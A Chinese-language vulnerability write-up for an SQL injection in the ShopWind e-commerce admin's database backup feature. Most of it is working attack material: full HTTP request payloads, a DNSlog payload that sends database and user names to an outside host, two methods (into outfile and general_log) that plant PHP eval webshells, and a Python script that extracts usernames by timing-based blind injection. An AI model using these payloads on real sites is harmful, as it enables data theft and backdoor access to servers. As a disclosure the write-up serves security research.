# Shopwind 存在 SQL注入

## 描述

漏洞页面为: \backend\libary\Database.php

http://host/admin/db/backup.html

ShopWind <= v3.4.2

ShopWind v3.4.2 在 Database.php 文件中存在一个SQL注入漏洞

[+]payload:

```sql
POST /admin/db/backup.html HTTP/1.1
Host: local.rapoo.top
Content-Length: 141
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://local.rapoo.top
Referer: http://local.rapoo.top/admin/db/backup.html
Accept-Language: zh-CN,zh;q=0.9
Cookie: switchHistory=website%2Fdb; UM_distinctid=1803c2602eb210-05a24410a265d9-1734337f-1fa400-1803c2602ec659; bjui_theme=purple; XDEBUG_SESSION=PHPSTORM; CNZZDATA1618465=cnzz_eid%3D555001816-1650273840-%26ntime%3D1650346840; advanced-backend=p78poo8n9hl27mks17hf2vlgll; _csrf-backend=ad56049615f6ba364b544685b88bf7aef7baeca4c875a1af3133961cccb509bfa%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-backend%22%3Bi%3A1%3Bs%3A32%3A%22y-o088Wj2bIB0WpJf8fRaiplRoDM9rDq%22%3B%7D; goodsBrowseHistory=c28cb2b6cbbb56efe1b54af4962a1184b1ff4c069830e85977639ad55216dd9ba%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22goodsBrowseHistory%22%3Bi%3A1%3Bs%3A2%3A%2226%22%3B%7D; advanced-frontend=bhikf56hlq22mu402s14in6d6e; _csrf-frontend=ec2187396433327b12bd8538772fae89ba08815dcf64c739e37d57d5d43e1c8fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22As8fd2CCmnh4ExTtegRpqbV4C9r-f4oO%22%3B%7D
Connection: close

tables%5B%5D=swd_address`;select load_file(concat('\\\\',(select database()),'.x6m87hw0.eyes.sh\\abc'));#&vol_size=100&backup_name=20220425_5
```

```sql
POST /admin/db/export.html HTTP/1.1
Host: local.rapoo.top
Content-Length: 12
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://local.rapoo.top
Referer: http://local.rapoo.top/admin/db/backup.html
Accept-Language: zh-CN,zh;q=0.9
Cookie: switchHistory=website%2Fdb; UM_distinctid=1803c2602eb210-05a24410a265d9-1734337f-1fa400-1803c2602ec659; bjui_theme=purple; XDEBUG_SESSION=PHPSTORM; CNZZDATA1618465=cnzz_eid%3D555001816-1650273840-%26ntime%3D1650346840; advanced-backend=p78poo8n9hl27mks17hf2vlgll; _csrf-backend=ad56049615f6ba364b544685b88bf7aef7baeca4c875a1af3133961cccb509bfa%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-backend%22%3Bi%3A1%3Bs%3A32%3A%22y-o088Wj2bIB0WpJf8fRaiplRoDM9rDq%22%3B%7D; goodsBrowseHistory=c28cb2b6cbbb56efe1b54af4962a1184b1ff4c069830e85977639ad55216dd9ba%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22goodsBrowseHistory%22%3Bi%3A1%3Bs%3A2%3A%2226%22%3B%7D; advanced-frontend=bhikf56hlq22mu402s14in6d6e; _csrf-frontend=ec2187396433327b12bd8538772fae89ba08815dcf64c739e37d57d5d43e1c8fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22As8fd2CCmnh4ExTtegRpqbV4C9r-f4oO%22%3B%7D
Connection: close

id=0&start=0
```

1.打开网址并进入管理页面
![image](https://user-images.githubusercontent.com/54017627/168496885-ea67becc-e174-4f20-a941-da2ceba57714.png)

2.通过文件路径和函数，我们知道触发注入的函数就是数据库备份函数。后台打开-网站建设-数据库-备份
![image](https://user-images.githubusercontent.com/54017627/168496894-d0f0ee7c-2441-48ab-ba91-0f1d6eec7b48.png)

3.选择要备份的表。这里我们选择一个小表来加快速度，然后设置浏览器代理来捕抓数据包
![image](https://user-images.githubusercontent.com/54017627/168496899-67d0adb2-12ff-43b0-88f7-810fd0818c09.png)

4.备份后，您可以获得两个数据包。一种是初始化，即获取要备份的表名，并在本地创建新的锁定文件
![image](https://user-images.githubusercontent.com/54017627/168496907-ca851f34-7a26-4673-8cbe-93c5f70e67d0.png)

5.修改并重放数据包。由于这里的SQL语句是显示创建表'$table'，我们可以使用'来关闭语句，同时用多行执行SQL语句，最后用#注释掉后续内容。由于无法使用错误报告，因此无法使用错误报告注入。然后我们可以尝试使用时间盲注入，dnslog out注入并使用网站的绝对路径编写webshell。

## 5.1.dnslog
条件是需要 root 权限，secure_file_Priv为空，则 POC 如下所示

```sql
swd_address`;select load_file(concat('\\\\',(select user()),'.x6m87hw0.eyes.sh\\abc'));#
```

![image](https://user-images.githubusercontent.com/54017627/168496662-8e1a3e24-5cb9-4be5-89a9-bf536d0a9a9c.png)

![image](https://user-images.githubusercontent.com/54017627/168496920-138da552-97f4-4c11-a3c4-906601ccdd31.png)

![image](https://user-images.githubusercontent.com/54017627/168496931-f3d4b02b-c3f3-45f6-87c9-d201b59877e2.png)

获取数据库成功

![image](https://user-images.githubusercontent.com/54017627/168496944-02b94169-4862-44f6-85e5-f11c8c02503e.png)

poc:
```sql
POST /admin/db/backup.html HTTP/1.1
Host: local.rapoo.top
Content-Length: 141
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://local.rapoo.top
Referer: http://local.rapoo.top/admin/db/backup.html
Accept-Language: zh-CN,zh;q=0.9
Cookie: switchHistory=website%2Fdb; UM_distinctid=1803c2602eb210-05a24410a265d9-1734337f-1fa400-1803c2602ec659; bjui_theme=purple; XDEBUG_SESSION=PHPSTORM; CNZZDATA1618465=cnzz_eid%3D555001816-1650273840-%26ntime%3D1650346840; advanced-backend=p78poo8n9hl27mks17hf2vlgll; _csrf-backend=ad56049615f6ba364b544685b88bf7aef7baeca4c875a1af3133961cccb509bfa%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-backend%22%3Bi%3A1%3Bs%3A32%3A%22y-o088Wj2bIB0WpJf8fRaiplRoDM9rDq%22%3B%7D; goodsBrowseHistory=c28cb2b6cbbb56efe1b54af4962a1184b1ff4c069830e85977639ad55216dd9ba%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22goodsBrowseHistory%22%3Bi%3A1%3Bs%3A2%3A%2226%22%3B%7D; advanced-frontend=bhikf56hlq22mu402s14in6d6e; _csrf-frontend=ec2187396433327b12bd8538772fae89ba08815dcf64c739e37d57d5d43e1c8fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22As8fd2CCmnh4ExTtegRpqbV4C9r-f4oO%22%3B%7D
Connection: close

tables%5B%5D=swd_address`;select load_file(concat('\\\\',(select database()),'.x6m87hw0.eyes.sh\\abc'));#&vol_size=100&backup_name=20220425_5
```

```sql
POST /admin/db/export.html HTTP/1.1
Host: local.rapoo.top
Content-Length: 12
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://local.rapoo.top
Referer: http://local.rapoo.top/admin/db/backup.html
Accept-Language: zh-CN,zh;q=0.9
Cookie: switchHistory=website%2Fdb; UM_distinctid=1803c2602eb210-05a24410a265d9-1734337f-1fa400-1803c2602ec659; bjui_theme=purple; XDEBUG_SESSION=PHPSTORM; CNZZDATA1618465=cnzz_eid%3D555001816-1650273840-%26ntime%3D1650346840; advanced-backend=p78poo8n9hl27mks17hf2vlgll; _csrf-backend=ad56049615f6ba364b544685b88bf7aef7baeca4c875a1af3133961cccb509bfa%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-backend%22%3Bi%3A1%3Bs%3A32%3A%22y-o088Wj2bIB0WpJf8fRaiplRoDM9rDq%22%3B%7D; goodsBrowseHistory=c28cb2b6cbbb56efe1b54af4962a1184b1ff4c069830e85977639ad55216dd9ba%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22goodsBrowseHistory%22%3Bi%3A1%3Bs%3A2%3A%2226%22%3B%7D; advanced-frontend=bhikf56hlq22mu402s14in6d6e; _csrf-frontend=ec2187396433327b12bd8538772fae89ba08815dcf64c739e37d57d5d43e1c8fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22As8fd2CCmnh4ExTtegRpqbV4C9r-f4oO%22%3B%7D
Connection: close

id=0&start=0
```

5.2 getshell with into outfile

条件是

1.根权限 

2.网站的绝对路径，并具有写入权限。您可以使用 outfile 和 into dumpfile 来写入 

使用访问和删除数据库备份的功能，获取网站的绝对路径。删除不存在的文件时，可以获取网站目录

```text
http://local.rapoo.top/admin/db/delete.html?backup_name=20220425_1
```

![image](https://user-images.githubusercontent.com/54017627/168497060-f357f235-8471-4331-9513-b2ec5adc5b75.png)

网站路径如下： 

D:\phpstudy_pro\WWW\local.rapoo.top\yii2-shopwind-h5\frontend\web 

然后我们可以使用以下POC

```sql
select 1,"<?php eval($_REQUEST[8])?>" into outfile 'D:/phpstudy_pro/WWW/local.rapoo.top/yii2-shopwind-h5/frontend/web/shell.php'
```

使用 burpsuite 发送以下两个数据包。每次都需要修改备份文件名
![image](https://user-images.githubusercontent.com/54017627/168497103-ef18017e-221e-44b5-8122-60ade502b510.png)

![image](https://user-images.githubusercontent.com/54017627/168497107-83000416-a997-4848-be02-e4ba050f51ac.png)

Webshell+已成功编写，未出现错误

![image](https://user-images.githubusercontent.com/54017627/168497148-8261b78b-7b37-4cc4-b143-0c56a4c53e98.png)

## 5.3 获取带有日志的webshell

条件是

1.根权限
2.网站的绝对路径，并具有写入权限。您可以使用outfile和 into dumpfile写入
3.支持堆栈查询

poc:
```sql
swd_address`;set global general_log = on;set global general_log_file = 'D:/phpstudy_pro/WWW/local.rapoo.top/yii2-shopwind-h5/frontend/web/log.php';select '<?php  @eval($_POST[1]);?>';#
```

发送数据包

![image](https://user-images.githubusercontent.com/54017627/168497241-c2f6002a-0a22-4c9b-95e5-781a81e74056.png)

![image](https://user-images.githubusercontent.com/54017627/168497249-e92fd56a-3f3f-4a7a-9cc1-8de9f9135a09.png)

getshell成功

![image](https://user-images.githubusercontent.com/54017627/168497259-83b71fe6-9c88-4137-a33e-412ca895a3fe.png)

## 5.4 盲注

poc:
```sql
swd_user`;select if(length(user())>0,sleep(2),1);#
```
![image](https://user-images.githubusercontent.com/54017627/168497275-a087c683-bc4f-4798-8135-13ed872cd291.png)

![image](https://user-images.githubusercontent.com/54017627/168497279-ee2db0bb-b728-4f50-b1b1-8af7ba446eb2.png)

python脚本：
```python
#!encoding:utf-8

import requests
import time


headers = {
	"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	"Cookie": "switchHistory=website%2Fdb; UM_distinctid=1803c2602eb210-05a24410a265d9-1734337f-1fa400-1803c2602ec659; bjui_theme=purple; XDEBUG_SESSION=PHPSTORM; CNZZDATA1618465=cnzz_eid%3D555001816-1650273840-%26ntime%3D1650346840; advanced-backend=p78poo8n9hl27mks17hf2vlgll; _csrf-backend=ad56049615f6ba364b544685b88bf7aef7baeca4c875a1af3133961cccb509bfa%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-backend%22%3Bi%3A1%3Bs%3A32%3A%22y-o088Wj2bIB0WpJf8fRaiplRoDM9rDq%22%3B%7D; goodsBrowseHistory=c28cb2b6cbbb56efe1b54af4962a1184b1ff4c069830e85977639ad55216dd9ba%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22goodsBrowseHistory%22%3Bi%3A1%3Bs%3A2%3A%2226%22%3B%7D; advanced-frontend=bhikf56hlq22mu402s14in6d6e; _csrf-frontend=ec2187396433327b12bd8538772fae89ba08815dcf64c739e37d57d5d43e1c8fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22As8fd2CCmnh4ExTtegRpqbV4C9r-f4oO%22%3B%7D"
}

def delete(url):
	url_delete = "{}/admin/db/delete.html?backup_name=20220425_1".format(url)
	url_delete_backup = "{}/admin/db/delete.html?backup_name=../backup.lock".format(url)
	try:
		r = requests.get(url=url_delete,headers=headers)
	except Exception as e:
		pass
	try:
		r = requests.get(url=url_delete_backup,headers=headers)
	except Exception as e:
		pass

def sql(url):
	url_backup = "{}/admin/db/backup.html".format(url)
	url_export = "{}/admin/db/export.html".format(url)

	data = {
		"id":"0",
		"start":"0"
	}
	#获取用户长度
	start = True
	i=0
	length = 0
	while start:
		data1 = {
			"tables[]":"swd_user`;select if((select length(username) from swd_user limit 0,1)={},sleep(2),1);#".format(i),
			"vol_size":"100",
			"backup_name":"20220425_1"
		}
		r = requests.post(url=url_backup,data=data1,headers=headers,timeout=2,proxies={"http":"http://127.0.0.1:8080"}).json()
		if "成功" in r['info']:
			try:
				r = requests.post(url=url_export,data=data,headers=headers,timeout=2,proxies={"http":"http://127.0.0.1:8080"})
			except Exception as e:
				length = i
				print(u"[+]用户名密码长度为:",i)
				start = False
			i+=1
			delete(url)
	result = ''
	for i in range(0,length):
		for j in range(35,128):
			data1 = {
				"tables[]":"swd_user`;select if(ascii(substr((select username from swd_user limit 0,1),{},1))={},sleep(3),1);#".format(i,j),
				"vol_size":"100",
				"backup_name":"20220425_1"
			}
			r = requests.post(url=url_backup,data=data1,headers=headers,timeout=2,proxies={"http":"http://127.0.0.1:8080"}).json()
			if "成功" in r['info']:
				try:
					r = requests.post(url=url_export,data=data,headers=headers,timeout=2)
				except Exception as e:
					result +=chr(j)
					print(u"[+]用户名密码为为:",result)
					i+=1
					delete(url)
					break
				j+=1
				delete(url)
			

sql("http://local.rapoo.top")
```

测试结果如下:

![image](https://user-images.githubusercontent.com/54017627/168497300-8477c393-54dc-4fbf-852b-737c547efb65.png)
